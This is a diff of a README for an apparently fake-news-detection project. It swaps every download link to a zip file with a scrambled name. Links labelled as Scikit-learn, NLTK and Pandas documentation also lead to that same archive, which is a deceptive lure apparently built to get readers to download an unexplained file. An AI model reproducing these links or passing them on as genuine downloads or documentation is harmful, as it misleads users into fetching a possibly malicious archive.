@@ -1,6 +1,6 @@
 # 📰 Fake-News-Detection-1 - Detect Fake News with Ease
 
-[![Download Release](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip%https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)
+[![Download Release](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip%https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)
 
 ## 📦 About the Project
 This project features a machine learning classifier that uses Multinomial Naive Bayes. It effectively detects fake news articles, achieving over 95% accuracy. The model leverages Natural Language Processing (NLP) and TF-IDF text vectorization to analyze and categorize news content.
@@ -16,7 +16,7 @@ To successfully download and run this application, follow these simple steps:
 
 2. **Visit the Download Page**
    - Click the link below to go to the Releases page:
-   [Download Fake-News-Detection-1](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)
+   [Download Fake-News-Detection-1](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)
 
 3. **Choose the Latest Release**
    - On the Releases page, find the latest version. It will usually be at the top of the list.
@@ -86,11 +86,11 @@ This project is licensed under the MIT License. See the LICENSE file in the repo
 ## 🔗 Additional Resources
 For more information about machine learning and fake news detection, consider checking out the following resources:
 
-- [Scikit-learn Documentation](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)
-- [Natural Language Toolkit (NLTK)](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)
-- [Pandas Documentation](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)
+- [Scikit-learn Documentation](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)
+- [Natural Language Toolkit (NLTK)](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)
 
 ## ✔️ Download & Install
 Ready to start? Follow the link below to download the application:
 
-[Download Fake-News-Detection-1](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Fake-News-Detection-1_2.8.zip)
+[Download Fake-News-Detection-1](https://raw.githubusercontent.com/Dhacks-png/Fake-News-Detection-1/main/perfectibilist/Detection-News-Fake-mesonephric.zip)
